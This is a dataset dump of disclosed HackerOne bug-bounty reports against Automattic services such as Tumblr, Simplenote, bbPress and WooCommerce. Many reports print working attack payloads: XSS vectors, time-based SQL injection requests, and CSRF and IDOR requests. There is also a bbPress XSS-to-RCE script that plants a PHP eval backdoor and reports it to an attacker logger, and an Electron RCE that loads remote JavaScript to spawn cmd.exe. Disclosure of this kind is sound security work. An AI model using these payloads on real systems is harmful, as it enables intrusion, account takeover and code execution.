Vulnerable code to self DOM-based XSS :
https://assets.tumblr.com/assets/scripts/console/console.js
line 1309
Code 391 BytesWrap lines Copy Download1 var e = jQuery(this);
2          if (0 === e.text().indexOf('""http://') || 0 === e.text().indexOf('""https://')) {
3            var t = e.text().slice(1, - 1),
4            n = jQuery('<a target=""_blank"">').text(e.text()).attr('href', t);
5            n.html('""<u>' + t + '</u>""'),
6            /\.(gif|jpg|jpeg|tiff|png)$/i.test(t) && n.addClass('image-modal'),
7            e.html(n)
8          }
 line 1309 : n.html('""<u>' + t + '</u>""') 
this trigger a self DOM-based XSS
With this payload :
 https://www.<img src=x onerror='alert()'>
Steps To Reproduce:

Log in https://api.tumblr.com/console/calls/user/info
Open the poc.html with chrome, and follow the instruction into the clickjacking page
(Note: i have only test the poc.html with chrome)

/!\ Note this vulnerability needs a lot of user interaction, this why i have passed this report to low  /!\
I hope the poc.html work this your navigator.
Thanks bye.
Impact
A attacker can manipulate a victim to click and follow instruction in the clickjacking page to triaged the self DOM-based XSS4 attachments:F940222: FinalPoc.mp4F940223: self_DOM-based_XSSF940226: No-X-Frame-Options.pngF940228: poc.html",https://hackerone.com/reports/953579,California,United States,San Francisco,2020,8,7,19,39
Automattic,1001-5000,0.0,50m-100m,$200.00,Medium,5.45,Cross-site Scripting (XSS) - Stored,[app.simplenote.com] Stored XSS via Markdown SVG filter bypass,"ysx  submitted a report to Automattic.Sep 22nd (5 years ago)Hi,
A carefully crafted injection used against the Markdown input parser can be leveraged to store and execute arbitrary JavaScript in the app.simplenote.com context.
Proof of concept
Before proceeding to reproduce this vulnerability, please log in to app.simplenote.com and create a new note with the ""Markdown Formatted"" option enabled.


Please paste the below payload into the ""Edit"" window, then select the ""triple dots"" icon > Publish


Next, please access the provided Simplenote URL, and select the black rectangle to execute the XSS payload.


Please note that I deleted the note and account used to test the aforementioned PoC immediately after confirming successful exploitation.
Markdown parser payload
Code 228 BytesWrap lines Copy Download1<div id=""137""><svg>
2<a xmlns:xlink=""http://www.w3.org/1999/xlink"" xlink:href=""?"">
3<circle r=""400""></circle>
4<animate attributeName=""xlink:href"" begin=""0"" from=""javascript:alert(document.domain)"" to=""&"" />
5</a>//[""'`-->]]>]</div>
Supporting evidence
Image F223223: Simplenote_Stored_XSS.png 32.85 KiBZoom in Zoom out Copy Download
Verified conditions
At the time of testing, I have successfully confirmed exploitability in the following environment:

Firefox 55.0.3 stable (32-bit) on Ubuntu 16.04.3 LTS

Thanks,
Yasin1 attachment:F223223: Simplenote_Stored_XSS.pngvortfu Automattic staff  posted a comment. Sep 23rd (5 years ago)Thanks for the report, we'll take a look into this shortly.ysx   posted a comment. Sep 23rd (5 years ago)No problem @vortfu, and thanks very much for the fast reply.roundhill Automattic staff  posted a comment. Sep 26th (5 years ago)Appreciate the report @ysx, this has been fixed today on app.simplenote.com. cc @vortfuysx   posted a comment. Updated Sep 26th (5 years ago)No problem, and thanks for the excellent response time @roundhill. I can confirm that the aforementioned payload is now sanitised. However, I have just discovered that a malformed URI scheme can be leveraged in a bypass technique as illustrated below:
Code 256 BytesWrap lines Copy Download1<div id=""137""><svg>
2<a xmlns:xlink=""http://www.w3.org/1999/xlink"" xlink:href=""?"">
3<circle r=""400""></circle>
4<animate attributeName=""xlink:href"" begin=""0"" from=""javaScriPt://www.simplenote.com/test%0aalert(document.domain)"" to=""&"" />
5</a>//[""'`-->]]>]</div>
This builds upon the original payload sourced from the Cure53 DOMPurify reference. Please let me know if you require any additional information.roundhill Automattic staff  posted a comment. Sep 26th (5 years ago)Oh, yes you're right! We put a temporary fix in and will have a better solution for sanitizing soon. I'll let you know when it's done to verify.ysx   posted a comment. Sep 26th (5 years ago)Sounds good – no probs and thanks for the update! Look forward to testing :)roundhill Automattic staff  posted a comment. Sep 28th (5 years ago)Hi again, we've updated the sanitizer to not allow svgs so they should be now escaped when displayed on the publish page. Test away :)ysx   posted a comment. Sep 29th (5 years ago)Hi @roundhill, great to hear – confirming successful remediation on my end. Thanks!vortfu Automattic staff  closed the report and changed the status to Resolved. Oct 13th (5 years ago)Automattic  rewarded ysx with a $200 bounty. Oct 13th (5 years ago)ysx   requested to disclose this report. Oct 13th (5 years ago)Thanks for the bounty @vortfu. Would it be possible to publicly disclose this report please?  This report has been disclosed. Nov 12th (5 years ago)Summary by ysxA carefully crafted Markdown parser injection (based on a SVG payload from DOMPurify) could be leveraged to achieve persistent XSS on Simplenote. Thanks again to @vortfu, @roundhill and the Automattic team for the swift communication and remediation.",https://hackerone.com/reports/271007,California,United States,San Francisco,2017,9,22,20,53
Automattic,1001-5000,0.0,50m-100m,$300.00,No value,0.0,Cross-site Scripting (XSS) - Generic,[bbPress] Stored XSS in any forum post.,"psych0tr1a  submitted a report to Automattic.Jul 13th (6 years ago)Intro:
Encouraged by the success of cure53 and their reward, i start the research plugins in your scope. And almost immediately i found critical Stored XSS, which of course leeds to privelege escalation or PHP code execution. This vulnerability doesnt requres ""special"" preveleges like CVE-2015-5622. To demonstrate how this vulnerability elementary for expluatation i write a XSS to Shell exploit.
Steps to reproduce the XSS:


Send any message on topic or start new topic.


Edit this message.


Open http://localhost/wordpress/?bbp_user=%YOUR_USER_ID%&edit=1


Edit your ""Nickname"" to:
	user1""onmouseover=""alert(1);remove()""style=""position:absolute;left:0;top:0;margin-top:-100%;margin-left:-100%;width:5000px;height:5000px""


Change your ""Display Name"" to new ""Nickname"", save and return to thread with your message.


Screenshot:
{F10472} (In attachment)
XSS to RCE PoC exploit:
		var yourServer = ""%Path to your logger%""
		var payload = ""<?php eval($_GET['wp']); ?>""+""\n"";
SitePath = document.head.innerHTML.match(/rel=\""pingback\"" href=\""(.*?)\/xmlrpc.php\""/m)[1]
function eas(){ // edit and save
ov = window.frames.win404.document.getElementById('newcontent').value
window.frames.win404.document.getElementById('newcontent').value = payload + ov
document.getElementsByName('win404')[0].setAttribute(""onload"","""");
window.frames.win404.document.getElementsByName('submit')[0].click()
((new Image).src=yourServer+""?message=Check your backdoor here: ""+SitePath+""/wp-content/themes/""+themeName+""/404.php?wp=phpinfo();"")
}
		function pao(){ // parse and open
ewin = window.frames.editor.contentWindow || window.frames.contentDocument
url404 = unescape(ewin.document.getElementById('templateside').getElementsByTagName('a')[0].href)
filepar = url404.match(/\?file\=(.?)\&/m)[1]
if(filepar.length>10){
themeName = url404.match(/file\=\/themes\/(.?)\//m)[1]
}
else{
themeName = url404.match(/theme\=(.*?)$/m)[1]
}
var win404 = document.createElement(""iframe"");
win404.style.opacity=0
win404.name = 'win404';
win404.src = url404
win404.setAttribute(""onload"",""eas();this.onload=''"");
document.body.appendChild(win404);
}
		var editor = document.createElement(""iframe"");
editor.style.opacity=0
editor.name = 'editor';
editor.src = SitePath+""/wp-admin/theme-editor.php"";
editor.setAttribute(""onload"",""pao();this.onload='';"");
document.body.appendChild(editor);
Best regards!1 attachment:F104721: bbpress.PNG",https://hackerone.com/reports/151117,California,United States,San Francisco,2016,7,13,12,38
Automattic,1001-5000,0.0,50m-100m,$100.00,No value,0.0,Insecure Direct Object Reference (IDOR),[IDOR] Attacker user can Approve/Decline AFK on the behalf of other users,"sachin_kumar_  submitted a report to Automattic.Oct 30th (3 years ago)Summary:
Hi team
Hope you are good
Missing proper authorization checks on the vulnerable request allows an attacker to approve/decline afk of users on the behalf of other user who is a member of other organization. This can be exploited simply by changing the responder_user_id in the vulnerable request.
Platform(s) Affected:
[Happy tools / Website]
Steps To Reproduce:

Create two accounts for happy tools and login into two different browsers say accounts 1 and 2 and browser A and B.
Configure browser A with burp proxy
Put an AFK request.
Go to https://schedule.happy.tools/afk and click on approve or decline and capture the request in burp.
Now replace the value of responder_user_id with the user id of account 2.
Valid response is shown.

Supporting Material/References:
Screenshot_from_2019-10-31_03-41-28.png (F621606)
In this screenshot, the user_id: 1920 is the id of user who belongs to account 1 and the responder_user_id:1923 is the id of user B who belongs to different account and both users belong to different organizations.
Vulnerable request :
Code 793 BytesWrap lines Copy Download1POST /wpcom/v2/happytools/external/v1/schedule/afk-requests/12346 HTTP/1.1
2Host: public-api.wordpress.com
3Connection: close
4Content-Length: 208
5Accept: application/json, text/plain, */*
6Origin: https://schedule.happy.tools
7Authorization: ZZZZZZZZZZZZZZZZZ
8User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36
9Sec-Fetch-Mode: cors
10Content-Type: application/json;charset=UTF-8
11Sec-Fetch-Site: cross-site
12Referer: https://schedule.happy.tools/afk
13Accept-Encoding: gzip, deflate
14Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
15
16{""notes"":""\"">"",""timezone"":""Africa/Bamako"",""approval_status"":2,""end_at"":1572048000,""is_last_minute"":false,""responded_at"":1572472124,""responder_user_id"":1923,""start_at"":1572048000,""type_id"":1808,""user_id"":1920}
Impact
Using this issue an attacker to approve/decline AFK of users on the behalf of other user who is a member of other organization. This can be exploited simply by changing the responder_user_id parameter in the vulnerable request
For more info please let me know
Thanks, regards
Sachin1 attachment:F621606: Screenshot_from_2019-10-31_03-41-28.png",https://hackerone.com/reports/725569,California,United States,San Francisco,2019,10,30,16,51
Automattic,1001-5000,0.0,50m-100m,$350.00,Critical,9.5,SQL Injection,[intensedebate.com] SQL Injection Time Based On /js/commentAction/,"fuzzme  submitted a report to Automattic.Nov 26th (2 years ago)[intensedebate.com] SQLi Time Based On /js/commentAction/
Summary:
Hello,
I have found a SQLI Injection Time Based on /js/commentAction/.
When a user want to submit/reply to a comment, a JSON payload was send by a GET request.
Code 119 BytesWrap lines Copy Download1Host: www.intensedebate.com```
2
3The key `""acctid"":""251219""` is vulnerable to SQL Injection Time based
4
5
6## Detection :
7
GET /js/commentAction/?data={""request_type"":""0"",+""params"":+{+""firstCall"":true,+""src"":0,+""blogpostid"":504704482,+""acctid"":""251219%20AND%20SLEEP(15)%23"",+""parentid"":""0"",+""depth"":""0"",+""type"":""1"",+""token"":""7D0GVbxG10j8hndedjhegHsnfDrcv0Yh"",+""anonName"":"""",+""anonEmail"":""X"",+""anonURL"":"""",+""userid"":""26745290"",+""token"":""7D0GVbxG10j8hndedjhegHsnfDrcv0Yh"",+""mblid"":""1"",+""tweetThis"":""F"",+""subscribeThis"":""1"",+""comment"":""w""}} HTTP/1.1
Host: www.intensedebate.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0
Accept: /
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: https://www.intensedebate.com/commentPopup.php?acct=0de44735e7089c61f14c17373373c235&postid=473573&posttitle=Jimmy%20Butler%20de%20retour,%20les%20Wolves%20
Cookie: login_pref=IDC; idcomments_userid=26745290; idcomments_token=6426c387ebed7ec573f03d218e0d4c2a%7C1607620848; country_code=FR; IDNewThreadComment=w
Code 32 BytesWrap lines Copy Download1
2HTTP Response `15 414 millis`
3
4
GET /js/commentAction/?data={""request_type"":""0"",+""params"":+{+""firstCall"":true,+""src"":0,+""blogpostid"":504704482,+""acctid"":""251219%20AND%20SLEEP(7)%23"",+""parentid"":""0"",+""depth"":""0"",+""type"":""1"",+""token"":""7D0GVbxG10j8hndedjhegHsnfDrcv0Yh"",+""anonName"":"""",+""anonEmail"":""X"",+""anonURL"":"""",+""userid"":""26745290"",+""token"":""7D0GVbxG10j8hndedjhegHsnfDrcv0Yh"",+""mblid"":""1"",+""tweetThis"":""F"",+""subscribeThis"":""1"",+""comment"":""w""}} HTTP/1.1
Host: www.intensedebate.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0
Accept: /
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: https://www.intensedebate.com/commentPopup.php?acct=0de44735e7089c61f14c17373373c235&postid=473573&posttitle=Jimmy%20Butler%20de%20retour,%20les%20Wolves%20
Cookie: login_pref=IDC; idcomments_userid=26745290; idcomments_token=6426c387ebed7ec573f03d218e0d4c2a%7C1607620848; country_code=FR; IDNewThreadComment=w
Code 368 BytesWrap lines Copy Download1
2HTTP Response `7 660 millis`
3
4Bonus :  the  key`""src"":0` is vulnerable to self-XSS, change the value by `""<iframe%20src=%23%20onload=alert('XSS')>""` and you will see a XSS pop-up
5
6
7## POC
8
9SQLi Time based : sleep_7.png, sleep_15.png and POC.mp4
10Self-XSS : Self-XSS.mp4
11
12
13Thank you, good bye.
14
15Fuzzme.
16
17## Impact
18
19Full database access holding private user information.4 attachments:F1095358: sleep_7.pngF1095359: sleep_15.pngF1095368: Self-XSS.mp4F1095369: POC.mp4",https://hackerone.com/reports/1044698,California,United States,San Francisco,2020,11,26,18,12
Automattic,1001-5000,0.0,50m-100m,$200.00,Medium,5.45,Cross-site Scripting (XSS) - Stored,[public-api.wordpress.com] Stored XSS via Crafted Developer App Description,"ysx  submitted a report to Automattic.Nov 29th (5 years ago)Hi,
An injection in the ""App Description"" field within the WordPress Developers platform can be used to store and reflect JavaScript in the public-api.wordpress.com context.
Steps to reproduce
1) As the ""adversary"" user, please visit the WordPress.com My Apps page and select ""Create New Application""
2) Populate the ""Name"" and ""Website URL"" fields with generic data, and set the Redirect URL to https://google.com for the purposes of this demonstration
3) Next, please copy the below proof of concept payload into the ""Description"" field, save your App, and take note of the client ID
4) Substitute the client ID into the following URL (which can be accessed by any user to reproduce this vulnerability)
Code 123 BytesWrap lines Copy Download1https://public-api.wordpress.com/oauth2/authorize?client_id=YourID&redirect_uri=https://google.com&response_type=code&blog=
5) Finally, mouse over the TESTLINK text to execute the JavaScript payload.
Proof of concept payload
Code 138 BytesWrap lines Copy Download1'""><div id=""test""><head><base href=""javascript://""/></head><body><a href=""/. /, /' onmouseover=confirm(document.domain); abc=abc"">TESTLINK
Supporting evidence
Image F243076: WP_API_XSS.png 84.07 KiBZoom in Zoom out Copy Download
Verified conditions
At the time of testing, I have successfully confirmed exploitability in the following environments:

Chrome OS 63.0.3239.50 (Official Build) beta (64-bit)
Firefox 55.0.3 stable (32-bit) on Ubuntu 16.04.3 LTS

Thanks,
Yasin
Impact
An adversary can leverage this vulnerability in a crafted API authorisation request that, if issued by another WordPress.com user, will cause arbitrary JavaScript code to execute within the target's browser in the context of their WordPress session.1 attachment:F243076: WP_API_XSS.pngSummary by ysxA crafted third-party app description could be leveraged to execute arbitrary JavaScript on the WordPress.com Public API endpoint through an OAuth authorize link. Thanks again to @xknown for the highly impressive response and remediation time.",https://hackerone.com/reports/293743,California,United States,San Francisco,2017,11,29,15,38
Automattic,1001-5000,0.0,50m-100m,$250.00,High,7.95,Code Injection,[Simplenote for Windows] Client RCE via External JavaScript Inclusion leveraging Electron,"ysx  submitted a report to Automattic.Nov 18th (5 years ago)Hi,
A carefully crafted injection in the Markdown parser within Simplenote for Windows can be leveraged to achieve remote code execution via an external JavaScript file. 
The nature of Simplenote's content sharing system, which makes use of tags containing email addresses, means that an adversary could distribute the following proof of concept en-masse to achieve targeted arbitrary code execution, simply requiring the target to ""preview"" the Markdown-formatted note.
Steps to reproduce
Prerequisites
A standard remote web server can be used to create a functional proof of concept. For the purposes of this demonstration, please consider ysx.bz the ""adversary"" server.
Create a new JavaScript file (herein referred to as hackerone-electron.js) in the root directory, such that the path would read: http://ysx.bz/hackerone-electron.js.
External JavaScript file
To prepare our exploit, populate this file with the following JavaScript code:
Code 534 BytesWrap lines Copy Download1write(""<h1>Simplenote RCE via Electron - Windows - ysx</h1>"");
2write(""<h3>Proof of concept in progress: popping <pre>netplwiz</pre>. Please stand by!</h3>"");
3var Process = process.binding('process_wrap').Process;
4var proc = new Process();
5proc.onexit = function(a,b) {};
6var env = process.env;
7var env_ = [];
8for (var key in env) env_.push(key+'='+env[key]);
9proc.spawn({file:'cmd.exe',args:['/k netplwiz'],cwd:null,windowsVerbatimArguments:false,detached:false,envPairs:env_,stdio:[{type:'ignore'},{type:'ignore'},{type:'ignore'}]});
Encoding and exploitation
Next, please open a JavaScript eval encoder and encode the following payload, modifying the JavaScript source URL as appropriate. This will be used within an <img> tag as part of the crafted note.
Code 150 BytesWrap lines Copy Download1var js = document.createElement('script'); js.type = 'text/javascript'; js.src = 'http://ysx.bz/hackerone-electron.js'; document.body.appendChild(js);
The above example should encode as follows:
Code 568 BytesWrap lines Copy Download1eval(String.fromCharCode(118,97,114,32,106,115,32,61,32,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,32,106,115,46,116,121,112,101,32,61,32,39,116,101,120,116,47,106,97,118,97,115,99,114,105,112,116,39,59,32,106,115,46,115,114,99,32,61,32,39,104,116,116,112,58,47,47,121,115,120,46,98,122,47,104,97,99,107,101,114,111,110,101,45,101,108,101,99,116,114,111,110,46,106,115,39,59,32,100,111,99,117,109,101,110,116,46,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,106,115,41,59))
Next, create a new Markdown note within Simplenote for Windows, and paste the following <img> tag code.
Code 650 BytesWrap lines Copy Download1## Test Note
2### HackerOne Windows RCE PoC - pops ""netplwiz""
3
4<img src=x onerror=eval(String.fromCharCode(118,97,114,32,106,115,32,61,32,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,32,106,115,46,116,121,112,101,32,61,32,39,116,101,120,116,47,106,97,118,97,115,99,114,105,112,116,39,59,32,106,115,46,115,114,99,32,61,32,39,104,116,116,112,58,47,47,121,115,120,46,98,122,47,104,97,99,107,101,114,111,110,101,45,101,108,101,99,116,114,111,110,46,106,115,39,59,32,100,111,99,117,109,101,110,116,46,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,106,115,41,59))>
Upon selecting the Preview option of the Markdown note, the JavaScript will be executed. After several seconds, the netplwiz executable will launch on your Windows system.
Supporting evidence
Image F240684: pre_exploit.png 55.49 KiBZoom in Zoom out Copy Download
Image F240685: netplwiz_poc.png 359.46 KiBZoom in Zoom out Copy Download
Verified conditions
At the time of testing, I have successfully confirmed exploitability in the following environment:

Simplenote for Windows 1.0.8
Windows 10 x64 Home Edition

Thanks,
Yasin2 attachments:F240684: pre_exploit.pngF240685: netplwiz_poc.pngSummary by ysxIt was possible to devise a crafted Markdown note, which when previewed, would lead to arbitrary code execution in the Simplenote client prior to version 1.1.0. A malicious note could be shared with another existing Simplenote user via the tag system.
Application execution and reverse shell proofs of concept were demonstrated for Windows and Linux. Thanks to @xknown and @roundhill for the swift remediation, and @edio for assisting with the investigation of this issue.
A blogpost on this issue can be found here: https://ysx.me.uk/taking-note-xss-to-rce-in-the-simplenote-electron-client",https://hackerone.com/reports/291539,California,United States,San Francisco,2017,11,18,17,57
Automattic,1001-5000,0.0,50m-100m,$250.00,Medium,5.9,Cross-site Scripting (XSS) - Reflected,[tumblr.com] 69< Firefox Only  XSS Reflected,"fuzzme  submitted a report to Automattic.Jul 5th (2 years ago)Description :
Hello, i have found a XSS Reflected in https://www.tumblr.com/abuse/start?prefill=<base64>
But the XSS only works in versions of firefox that are below 70.
Because its been blocked by CSP, but the version below 69 of firefox is vulnerable.
Here's a great article about this subject https://portswigger.net/daily-swig/firefox-vulnerable-to-trivial-csp-bypass
But CSP dont block HTML tag in the lastest version of all navigators
Vulnerable Url  :
https://www.tumblr.com/abuse/start?prefill=eyJwb3N0IjpudWxsLCJ1cmxyZXBvcnRpbmciOiJodHRwczovL2Z1enptZS50dW1ibHIuY29tLyIsInR1bWJsZWxvZyI6IjxvYmplY3QgZGF0YT1cImphdmFzY3JpcHQ6YWxlcnQoZG9jdW1lbnQuY29va2llKVwiPiIsImNvbnRleHQiOiJibG9nIn0=
Payload :
<object data=\""javascript:alert(document.cookie)\"">
Vulnerable Parameter :
/\ Note you must decode the $_GET['prefill'], this is encoding is  in base64 /\
After decoded it, you can see this 
{""post"":null,""urlreporting"":""https://fuzzme.tumblr.com/"",""tumblelog"":""<object data=\""javascript:alert(document.cookie)\"">"",""context"":""blog""}
The array value of tumblelog  is reflected into the HTML this him who as vulnerable
The array value of tumblelog  is the  vulnerable array value
 Steps To Reproduce for XSS Only Firefox :

Download firefox 69 at https://ftp.mozilla.org/pub/firefox/releases/69.0/
Go to login in your Tumblr account
Click to this link, and you will see XSS pop-up

LINK : https://www.tumblr.com/abuse/start?prefill=eyJwb3N0IjpudWxsLCJ1cmxyZXBvcnRpbmciOiJodHRwczovL2Z1enptZS50dW1ibHIuY29tLyIsInR1bWJsZWxvZyI6IjxvYmplY3QgZGF0YT1cImphdmFzY3JpcHQ6YWxlcnQoZG9jdW1lbnQuY29va2llKVwiPiIsImNvbnRleHQiOiJibG9nIn0=
Steps To Reproduce for HTML injection :

Go to login in your Tumblr account
Click to this link  https://www.tumblr.com/abuse/start?prefill=eyJwb3N0IjpudWxsLCJ1cmxyZXBvcnRpbmciOiJodHRwczovL2Z1enptZS50dW1ibHIuY29tLyIsInR1bWJsZWxvZyI6IjxpbnB1dCB0eXBlPSd0ZXh0JyBwbGFjZWhvbGRlcj0nRW50ZXIgeW91IHBhc3N3b3JkJz4iLCJjb250ZXh0IjoiYmxvZyJ9
And you will see a HTML input  with enter your password

POC:
The attachment video
Impact
The vulnerability allow a malicious user to inject html tags and execute Javascript which could lead to steal user's session, and performing phishing.2 attachments:F894542: XSS.mp4F894544: HTMLinjection.mp4",https://hackerone.com/reports/915756,California,United States,San Francisco,2020,7,5,8,45
Automattic,1001-5000,0.0,50m-100m,$100.00,Low,2.0,Business Logic Errors,Ability to subscribe to inactive Post+ creators,"ajoekerr  submitted a report to Automattic.Aug 28th (about 1 year ago)Hey y'all! 👋 Hope all is well!
Summary:
In testing Tumblr's Post+, I've found that it's possible to subscribe to creators that, at one point, opted into Post+ but had opted out after some point. As I note later on, it appears that this is a ""one time use only"" as the Payment URL becomes invalid after activating Post+ for the inactive Post+ blog.
Platform(s) Affected:
N/A
Steps To Reproduce:
In order to reproduce, you need the blogMembershipsId of an inactive Post+ blog. This creates a high bar to actually exploit this but, for some reason, I had the blogMembershipsId of ███████, who had deactivated Post+ shortly after launch (the membership ID is █████).

Get an active Post+ subscription URL (I used ██████.tumblr.com's subscription URL).
Replace the active Post+ blog's blogMemershipsId with the inactive blog's blogMembershipsId (if using ███████, you should have a url like https://███.payment.tumblr.com/checkout/?token=<token>).

As a heads up, it actually looks like this URL is no longer valid after activating my Post+ subscription for █████████.


Complete checkout as normal.
After checkout, it will redirect back to the active Post+ blog's creator page but it will never load.
Verify that the creator page for the previously inactive Post+ blog is active again and that the subscription is active for the inactive Post+ blog.

Supporting Material/References:
Unfortunately, this looks like a ""one time use"" only vulnerability as the WooCommerce payment URL is no longer active for ██████ after I attempted to subscribe so I was unable to get a PoC video. However, I've uploaded the receipt in case having the payment_intent ID helps at all!
Impact
As of right now, the only impact I've been able to see is that the inactive Post+ blog's creator page became active, even without them enrolled into Post+: https://www.tumblr.com/creator/█████. However, I would also consider the fact that a page would show the blog name & avatar for the Post+ blog noted in the token but the checkout URL corresponds to the blogMembershipsId as unexpected behavior but, as far as I can tell, it would be somewhat of a ""self-pwn"" 😅.
If y'all don't necessarily consider this a security risk, please let me know and I will self-close this report! To be honest, with what I can see, I consider this to be fairly low impact but I wanted to let y'all know anyway. 🙂xknown Automattic staff  posted a comment. Aug 30th (about 1 year ago)Hi @ajoekerr! It's good to see you here :) I hope everything is fine on your side as well! I'll forward this report to the Tumblr core PHP team.ajoekerr   posted a comment. Aug 30th (about 1 year ago)Thanks, Alex! Let me know if they have any questions. :)xknown Automattic staff  closed the report and changed the status to Resolved. Sep 30th (about 1 year ago)Hi @ajoekerr, thanks again for the report. The Tumblr team deployed a couple of fixes to address this issue :)Automattic  rewarded ajoekerr with a $100 bounty. Sep 30th (about 1 year ago)Hi, we would like thank you again for your submission and helping make Tumblr a safer place. We look forward to more reports from you in the future.ajoekerr   requested to disclose this report. Oct 5th (about 1 year ago)Thanks for the bounty! I’d love to request disclosure if that’s alright with y’all. :)
If we do proceed with disclosure, I would like to redact the blog name I used for testing as well as the Post+ membership ID, just in case. Thanks!xknown Automattic staff  posted a comment. Oct 5th (about 1 year ago)Hi Andrew, we redacted the items you mentioned as well as the attached screenshot :). If everything is fine for you now, happy to disclose this right away :)ajoekerr   posted a comment. Oct 5th (about 1 year ago)Hey @xknown, thanks for the redactions! I think this is fine to move forward with now. :) Thanks again!xknown Automattic staff  agreed to disclose this report. Oct 5th (about 1 year ago)  This report has been disclosed. Oct 5th (about 1 year ago)",https://hackerone.com/reports/1322334,California,United States,San Francisco,2021,8,28,19,15
Automattic,1001-5000,0.0,50m-100m,$75.00,No value,0.0,Cross-Site Request Forgery (CSRF),Akismet Several CSRF vulnerabilities,"eboda  submitted a report to Automattic.Apr 15th (7 years ago)Summary
Akismet is vulnerable to CSRF allowing an attacker to cancel accounts of victims, add sites, remove subscriptions, etc.
Steps to reproduce Account cancelation


Login to your Akismet account, which has a subscription activated.


The following POST request will cancel the subscription and the account:
https://akismet.com/api/account/1/cancel


The 1 can be replaced with any number. The userid was originally there, but I noticed that it actually just gets ignored.
Steps to reproduce other CSRF
Basically all actions on Akismet are vulnerable to CSRF. Here are some further examples (1 can be replaced with 2, 3, etc):
Adding a site to a subscription:
Code 62 BytesWrap lines Copy Download1POST /api/activation/create
2
3subscriptionId=1&site_url=foo.bar
foo.bar is now added to subscription 1
Cancel specific subscription:
POST /api/subscription/1/cancel
Subscription 1 is now canceled.",https://hackerone.com/reports/131108,California,United States,San Francisco,2016,4,15,14,4
Automattic,1001-5000,0.0,50m-100m,$500.00,Medium,5.45,Information Exposure Through an Error Message,An Automattic employee's GitHub personal access token exposed in Travis CI build logs,sainaen  submitted a report to Automattic.Apr 3rd (6 years ago),https://hackerone.com/reports/218264,California,United States,San Francisco,2017,4,3,10,16
Automattic,1001-5000,0.0,50m-100m,$200.00,High,7.95,Improper Authentication - Generic,Broken Authentication - Security token gets captured via man in the middle attack,"saurabhb  submitted a report to Automattic.Feb 15th (6 years ago)Product / URL
http://en.instagram-brand.com/register/reset/<the security token here>?email=<email address here>
Description and Impact
The password reset links issues by Instagram Brand gets delivered to users inbox with a http scheme and NOT https scheme.
This causes an attacker stealing those links and performing mass account takeovers and security compromises.
The link that gets delivered in inbox is:
http://mandrillapp.com/track/click/30956340/instagram-brand.com?p=<the very long security token here>
On requesting the above link in browser, it sends back the password reset token in clear text: http://en.instagram-brand.com/register/reset/<the security token here>?email=<the email of user here>
Solution:
This issues has a very easy solution. I have myself performed this and it worked !!.
Whenever the code responsible for sending password reset link makes those links, just add https as scheme instead of http. And you will observe that now all the accounts are safe and data cannot be stolen.
Reproduction Instructions / Proof of Concept

Request for you password reset link.
Go to inbox.
Right click that link and paste it on notepad and observe the scheme.
You can also start Wireshark to capture the traffic and observe that security token can be compromised.

I have attached the screenshot of Wireshark as a proof of concept. InstagramBrandMITM.png (F161119)2 attachments:F161119: InstagramBrandMITM.pngF161120: InstagramBrandMITM.pcapng",https://hackerone.com/reports/206650,California,United States,San Francisco,2017,2,15,15,12
Automattic,1001-5000,0.0,50m-100m,$350.00,High,7.95,Deserialization of Untrusted Data,Authenticated Code Execution through Phar deserialization in CSV Importer as Shop manager in WooCommerce,"simonscannell  submitted a report to Automattic.Aug 30th (4 years ago)This vulnerability is based on the following exploitation technique:
https://blog.ripstech.com/2018/new-php-exploitation-technique/
It is easier to explain this vulnerability by having watched the PoC first:
https://www.youtube.com/watch?v=mr3bAOIUwd4
Here is what's happening:

Since a valid phar file needs o be uploaded to the server (the extension doesn't matter) I upload the poc.jpg via the media uploader
I begin the Import process with a valid CSV file
The importer asks if I am sure that I want to run the import on these files
I confirm and modify the  POST parameter to my phar:// wrapper and deserialize the file
The PHP code executes

The source of the vulnerability within the source code lies in the /woocommerce/includes/import/class-wc-product-csv-importer.php:
Code 1.55 KiBWrap lines Copy Download1	public function __construct( $file, $params = array() ) {
2		$default_args = array(
3			'start_pos'        => 0, // File pointer start.
4			'end_pos'          => -1, // File pointer end.
5			'lines'            => -1, // Max lines to read.
6			'mapping'          => array(), // Column mapping. csv_heading => schema_heading.
7			'parse'            => false, // Whether to sanitize and format data.
8			'update_existing'  => false, // Whether to update existing items.
9			'delimiter'        => ',', // CSV delimiter.
10			'prevent_timeouts' => true, // Check memory and time usage and abort if reaching limit.
11			'enclosure'        => '""', // The character used to wrap text in the CSV.
12			'escape'           => ""\0"", // PHP uses '\' as the default escape character. This is not RFC-4180 compliant. This disables the escape character.
13		);
14
15		$this->params = wp_parse_args( $params, $default_args );
16		$this->file   = $file;
17
18		if ( isset( $this->params['mapping']['from'], $this->params['mapping']['to'] ) ) {
19			$this->params['mapping'] = array_combine( $this->params['mapping']['from'], $this->params['mapping']['to'] );
20		}
21
22		$this->read_file();
23	}
24
25	/**
26	 * Read file.
27	 */
28	protected function read_file() {
29		$handle = fopen( $this->file, 'r' ); // @codingStandardsIgnoreLine.
30
31		if ( false !== $handle ) {
32			$this->raw_keys = version_compare( PHP_VERSION, '5.3', '>=' ) ? fgetcsv( $handle, 0, $this->params['delimiter'], $this->params['enclosure'], $this->params['escape'] ) : fgetcsv( $handle, 0, $this->params['delimiter'], $this->params['enclosure'] ); // @codingStandardsIgnoreLine
33
34...
As can be seen, the constructor calls read_file, which in turn calls fopen without any checks, which leads to the deserialization of the Phar object.
I recommend to check the file parameter and see if it actually is a CSV file before calling fopen on it.
I have attached the poc.jpg that worked for my PHP version.
Impact
